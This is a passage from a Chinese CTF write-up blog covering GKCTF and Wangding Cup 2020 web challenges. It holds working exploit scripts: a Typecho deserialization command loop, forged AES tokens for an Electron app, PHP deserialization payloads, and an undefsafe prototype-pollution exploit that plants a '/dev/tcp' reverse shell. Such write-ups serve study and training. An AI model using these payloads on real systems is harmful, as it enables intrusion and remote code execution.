<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">'http://d5e2c1fd-922b-4951-8f56-62994bed32fd.node3.buuoj.cn/install.php?finish=1'</span></span><br><span class="line">files=&#123;<span class="string">'file'</span>:<span class="number">123</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">'Referer'</span>:<span class="string">'http://d5e2c1fd-922b-4951-8f56-62994bed32fd.node3.buuoj.cn/install.php'</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd=base64.b64encode(input(<span class="string">'shell&gt;'</span>).encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    payload=os.popen(<span class="string">'php exp.php %s'</span> % cmd).read().strip()</span><br><span class="line">    cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'test'</span>,<span class="string">'__typecho_config'</span>:payload&#125;</span><br><span class="line">    r = requests.post(url,files=files,headers=headers,cookies=cookies,data=&#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>:<span class="string">'123456789'</span>&#125;)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/26/WtMv9DQ4ISFZiOu.png" alt="image-20200525204705494"></p>
<p><code>cat /flag</code>得到flag</p>
<h3 id="Node-Exe"><a href="#Node-Exe" class="headerlink" title="Node-Exe"></a>Node-Exe</h3><p>web+re？</p>
<p>electron程序，解压得到源码</p>
<p>弱口令admin/admin进去了（后面发现写死在源码里</p>
<p>两个假flag</p>
<p>既然有了源码那就先用asar工具解包<code>.\resources\app.asar</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">asar extract app.asar ./app/</span><br></pre></td></tr></table></figure>

<p><code>index.js</code>没什么东西，看<code>renderer.js</code></p>
<p>东西有点多，先用fiddler抓个包看看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;209e50c7-fc1f-45b4-a191-62750a66e74d.node3.buuoj.cn&#x2F;buyflag HTTP&#x2F;1.1</span><br><span class="line">Host: 209e50c7-fc1f-45b4-a191-62750a66e74d.node3.buuoj.cn</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 34</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Origin: file:&#x2F;&#x2F;</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) ctf-project&#x2F;0.0.1 Chrome&#x2F;61.0.3163.100 Electron&#x2F;2.0.18 Safari&#x2F;537.36</span><br><span class="line">token: ac84b67031d2daffe96f0c45cb3b693a66456997f6bee766ada46ecbff7676bba3fe54d12d45fe3650e05d37c28d79c9</span><br><span class="line">Content-Type: application&#x2F;json;charset&#x3D;UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:1,&quot;timestamp&quot;:1590412847000&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到有个变换的一次性的token，应该是本机生成的</p>
<p>body POST了一个<code>id</code>和<code>timestamp</code></p>
<p>尝试使用Fiddler拦截改数据，被检测到了，那就回去查看token的生成源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">encrypt: <span class="function"><span class="keyword">function</span>(<span class="params">e, i, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> c()(a.a.mark((<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.a.wrap((<span class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (o.prev = o.next) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> o.abrupt(<span class="string">"return"</span>, <span class="keyword">new</span> s.a((<span class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">var</span> n = p.a.createCipheriv(<span class="string">"aes-128-cbc"</span>, e, i),</span><br><span class="line">                            r = n.update(t, <span class="string">"utf8"</span>, <span class="string">"binary"</span>);</span><br><span class="line">                        r += n.final(<span class="string">"binary"</span>), o(r = <span class="keyword">new</span> Buffer.from(r, <span class="string">"binary"</span>).toString(<span class="string">"hex"</span>))</span><br><span class="line">                    &#125;)));</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"end"</span>:</span><br><span class="line">                    <span class="keyword">return</span> o.stop()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), n, o)</span><br><span class="line">    &#125;)))()</span><br><span class="line">&#125;,</span><br><span class="line">makeToken: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> c()(a.a.mark((<span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> o, r;</span><br><span class="line">        <span class="keyword">return</span> a.a.wrap((<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (t.prev = t.next) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"31169fedc9a20ecf"</span>, <span class="string">"d96adeefaa0102a9"</span>, o = f()(n()(e)), t.next = <span class="number">5</span>, i.encrypt(<span class="string">"31169fedc9a20ecf"</span>, <span class="string">"d96adeefaa0102a9"</span>, o);</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                    <span class="keyword">return</span> r = t.sent, t.abrupt(<span class="string">"return"</span>, r);</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"end"</span>:</span><br><span class="line">                    <span class="keyword">return</span> t.stop()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), t, i)</span><br><span class="line">    &#125;)))()</span><br><span class="line">&#125;,</span><br><span class="line">buyFlag: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> c()(a.a.mark((<span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> o;</span><br><span class="line">        <span class="keyword">return</span> a.a.wrap((<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (t.prev = t.next) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> o = &#123;</span><br><span class="line">                        id: e,</span><br><span class="line">                        timestamp: <span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>)</span><br><span class="line">                    &#125;, t.t0 = i.$http, t.t1 = i.url + <span class="string">"/buyflag"</span>, t.t2 = o, t.next = <span class="number">6</span>, i.makeToken(o);</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                    t.t3 = t.sent, t.t4 = &#123;</span><br><span class="line">                        token: t.t3</span><br><span class="line">                    &#125;, t.t5 = &#123;</span><br><span class="line">                        headers: t.t4</span><br><span class="line">                    &#125;, t.t6 = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                        i.$Modal.info(&#123;</span><br><span class="line">                            title: <span class="string">"购买结果"</span>,</span><br><span class="line">                            content: e.data[<span class="number">0</span>].flag</span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125;, t.t0.post.call(t.t0, t.t1, t.t2, t.t5).then(t.t6);</span><br><span class="line">                <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"end"</span>:</span><br><span class="line">                    <span class="keyword">return</span> t.stop()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), t, i)</span><br><span class="line">    &#125;)))()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析如下：</p>
<ol>
<li><code>id</code> 和 <code>timestamp</code>构造一个请求体（<code>e</code>）之后传入<code>makeToken</code></li>
<li>然后<code>o = f()(n()(e))</code>，看不懂的神秘操作</li>
<li>最后经过<code>key</code>=<code>31169fedc9a20ecf</code>, <code>iv</code>=<code>d96adeefaa0102a9</code>的aes加密得到token</li>
</ol>
<p>使用上面抓到的包来进行AES解密，得到一串32位小写字符串，因为node包中存在<code>js-md5</code>，猜测进行了md5加密</p>
<p>将请求体进行md5加密，得到相同的结果</p>
<p><img src="https://i.loli.net/2020/05/26/aiBreME3zF9jvZd.png" alt="image-20200525215816848"></p>
<p>至此分析完毕，编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> algorithms</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrpCrypt</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, iv)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.mode = AES.MODE_CBC</span><br><span class="line">        self.iv = iv</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密函数，如果text不足16位就用空格补足为16位，</span></span><br><span class="line">    <span class="comment"># 如果大于16当时不是16的倍数，那就补足为16的倍数。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        cryptor = AES.new(self.key, self.mode, self.iv)</span><br><span class="line">        text = text.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 这里密钥key 长度必须为16（AES-128）,</span></span><br><span class="line">        <span class="comment"># 24（AES-192）,或者32 （AES-256）Bytes 长度</span></span><br><span class="line">        <span class="comment"># 目前AES-128 足够目前使用</span></span><br><span class="line">        </span><br><span class="line">        text=self.pkcs7_padding(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.ciphertext = cryptor.encrypt(text)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 因为AES加密时候得到的字符串不一定是ascii字符集的，输出到终端或者保存时候可能存在问题</span></span><br><span class="line">        <span class="comment"># 所以这里统一把加密后的字符串转化为16进制字符串</span></span><br><span class="line">        <span class="keyword">return</span> b2a_hex(self.ciphertext).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pkcs7_padding</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(data, bytes):</span><br><span class="line">            data = data.encode()</span><br><span class="line"></span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line"></span><br><span class="line">        padded_data = padder.update(data) + padder.finalize()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> padded_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pkcs7_unpadding</span><span class="params">(self,padded_data)</span>:</span></span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        data = unpadder.update(padded_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            uppadded_data = data + unpadder.finalize()</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'无效的加密信息!'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> uppadded_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密后，去掉补足的空格用strip() 去掉</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, text)</span>:</span></span><br><span class="line">    	<span class="comment">#偏移量'abcdefg'</span></span><br><span class="line">        cryptor = AES.new(self.key, self.mode, self.iv)</span><br><span class="line">        plain_text = cryptor.decrypt(a2b_hex(text))</span><br><span class="line">        <span class="comment"># return plain_text.rstrip('\0')</span></span><br><span class="line">        <span class="keyword">return</span> bytes.decode(plain_text).rstrip(<span class="string">'\x10'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pc=PrpCrypt(<span class="string">'31169fedc9a20ecf'</span>.encode(<span class="string">'utf-8'</span>),<span class="string">'d96adeefaa0102a9'</span>.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">url = <span class="string">'http://e359c8e7-501c-42a2-b493-6a9d1a8068c6.node3.buuoj.cn/buyflag'</span></span><br><span class="line">headers = &#123;<span class="string">'Content-Type'</span>:<span class="string">'application/json;charset=UTF-8'</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = json.dumps(&#123;<span class="string">'id'</span>:input(<span class="string">'id&gt;'</span>),<span class="string">'timestamp'</span>:int(time.time())*<span class="number">1000</span>&#125;).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    e = hashlib.md5(data.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    token = pc.encrypt(e)</span><br><span class="line">    headers[<span class="string">'token'</span>]=token</span><br><span class="line">    r = requests.post(url,headers=headers,data=data)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/26/LdyQERbzHxvw9aG.png" alt="image-20200525223655258"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>gkctf</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2020-Web&amp;Misc</title>
    <url>/2020/05/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-Web-Misc/</url>
    <content><![CDATA[<h1 id="青龙组"><a href="#青龙组" class="headerlink" title="青龙组"></a>青龙组</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><p>给出了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的反序列化</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">"flag.php"</span>;</span><br><span class="line">$o = <span class="keyword">new</span> FileHandler($filename);</span><br><span class="line"><span class="keyword">echo</span>((serialize($o)));</span><br></pre></td></tr></table></figure>

<p>生成后有两种方式绕过<code>is_valid</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;i:2;s:11:&quot;%00*%00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;%00*%00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>php版本为<code>PHP/7.4.3</code>将<code>protect</code>替换成<code>public</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>使用<code>S</code>和反斜杠<code>\</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>当时比赛的时候发现php的<code>__destruct()</code>有个特性</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvbGFuZ3VhZ2Uub29wNS5kZWNvbi5waHAjbGFuZ3VhZ2Uub29wNS5kZWNvbi5kZXN0cnVjdG9y">https://www.php.net/manual/zh/language.oop5.decon.php#language.oop5.decon.destructor<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p><strong>Note</strong>:</p>
<p>析构函数在脚本关闭时调用，此时所有的 HTTP 头信息已经发出。脚本关闭时的工作目录有可能和在 SAPI（如 apache）中时不同。</p>
</blockquote>
<p>会发生<strong>工作目录改变</strong>的情况，这种情况可以<strong>更改成员变量个数绕过</strong>，或者读取<code>/proc/self</code>里的东西得知工作目录，使用绝对路径绕过。（不知道为什么buuoj复现的时候不需要？？？</p>
<h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>拿到源码先看引用的库和url路由</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br></pre></td></tr></table></figure>

<p>引用了一个<code>undefsafe</code>的库，<span class="exturl" data-url="aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1VTkRFRlNBRkUtNTQ4OTQw">CVE-2019-10795<i class="fa fa-external-link-alt"></i></span></p>
<p>利用点：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以用于污染<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82ODZiNjFjNGE0M2Q=">原型链<i class="fa fa-external-link-alt"></i></span></p>
<p>路由：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p><code>/status</code>中发现一个<code>exec</code></p>
<p><code>commands</code>继承原型链，实现命令执行</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">"http://caaec91a-1eea-4f5f-b977-e48255a9f22f.node3.buuoj.cn/"</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    sess.get(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"author"</span>: <span class="string">"/bin/bash -i &gt; /dev/tcp/frps/6009 0&gt;&amp;1"</span>,</span><br><span class="line">        <span class="string">"id"</span>: <span class="string">"__proto__"</span>,</span><br><span class="line">        <span class="string">"raw"</span>: <span class="string">"/bin/bash -i &gt; /dev/tcp/frps/6009 0&gt;&amp;1"</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = sess.post(<span class="string">f"<span class="subst">&#123;url&#125;</span>edit_note"</span>, json=data).text</span><br><span class="line">    sess.get(<span class="string">f"<span class="subst">&#123;url&#125;</span>status"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行反弹shell <code>cat /flag</code> 得到flag</p>
